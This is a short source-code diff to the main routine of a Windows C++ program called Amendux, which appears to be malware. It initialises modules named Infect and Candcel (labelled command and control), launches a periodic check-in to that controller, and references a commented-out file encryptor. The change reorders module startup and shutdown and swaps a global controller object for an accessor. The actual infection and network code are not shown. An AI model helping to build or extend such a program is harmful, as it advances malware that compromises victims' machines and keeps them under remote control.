@@ -13,10 +13,6 @@
 #define MAX_LOADSTRING  100
 #define MUTEX           L"avcmtx"
 
-// Global modules
-// Amendux::Encrypt FileCrypt;                  // File encryptor module
-Amendux::Candcel Commander;                     // Command and Control
-
 // Global Variables:
 HINSTANCE hInst;                                // Current instance
 HANDLE hMutex;									// Instance mutx lock
@@ -62,12 +58,12 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
 	}
 
 	// Run core classes
-	Amendux::Candcel::Init();
 	Amendux::Infect::Init();
+	Amendux::Candcel::Init();
 	Amendux::ModuleLoader::Init();
 
 	// Launch the checkin process
-	Amendux::Candcel::SpawnInterval(&Commander);
+	Amendux::Candcel::SpawnInterval(Amendux::Candcel::Current());
 
 	// Window accelerators
 	HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_WIN32PROJECT1));
@@ -85,8 +81,8 @@ TerminateInstance:
 
 	// Terminate modules in reverse order
 	Amendux::ModuleLoader::Terminate();
-	Amendux::Infect::Terminate();
 	Amendux::Candcel::Terminate();
+	Amendux::Infect::Terminate();
 	Amendux::Config::Terminate();
 	Amendux::Log::Terminate();
 
